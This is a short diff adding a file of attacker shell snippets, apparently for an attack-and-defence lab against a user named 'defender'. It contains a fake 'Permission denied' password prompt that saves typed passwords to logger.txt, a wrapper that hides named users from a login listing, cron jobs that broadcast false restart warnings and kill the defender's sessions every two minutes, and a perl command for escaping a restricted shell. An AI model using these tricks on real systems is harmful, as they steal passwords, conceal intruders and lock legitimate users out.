@@ -1,0 +1,25 @@
+#!/bin/bash
+
+#Stores IP address
+IPADDR=$(hostname -I | awk '{print $1}')
+# Ask for login
+echo "Permission denied, please try again.
+defender@$IPADDR's password: "; read -sr login
+echo "$login" >> logger.txt
+
+
+
+#!/bin/bash
+
+/usr/bin/ww $1 | grep -v 'abdullayev.coshgun' | grep -v 'root' | grep -v 'abdullayev' | grep -v 'coshgun' 
+
+
+* * * * * /usr/bin/wall -n "The system will be restarted in 2 minutes"
+*/2 * * * * /usr/bin/pkill -u defender
+
+
+#Escaping the perl interpreter, type the command below, hit 'Enter', and then hit 'CTRL+D' to run the command and open a shell
+exec'/bin/sh';
+
+
+https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/
